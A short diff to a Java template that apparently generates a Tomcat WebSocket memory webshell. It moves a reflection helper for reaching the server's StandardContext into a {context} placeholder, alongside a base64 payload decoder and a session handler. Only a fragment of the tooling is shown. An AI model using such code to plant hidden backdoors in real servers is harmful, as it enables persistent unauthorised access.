@@ -95,13 +95,6 @@ public class TomcatWsFilter extends Endpoint
         }}
     }}
 
-    private Object getStandardContext() {{
-        return invokeMethod(
-            getFieldValue(getLoader(), "resources"),
-            "getContext"
-        );
-    }}
-
     private byte[] b64decode(String payload) {{
         Class base64;
         byte[] bytes = null;
@@ -125,6 +118,7 @@ public class TomcatWsFilter extends Endpoint
     }}
 {decoder}
 {stub}
+{context}
     @Override
     public void onOpen(Session s, EndpointConfig epc) {{
         session = s;
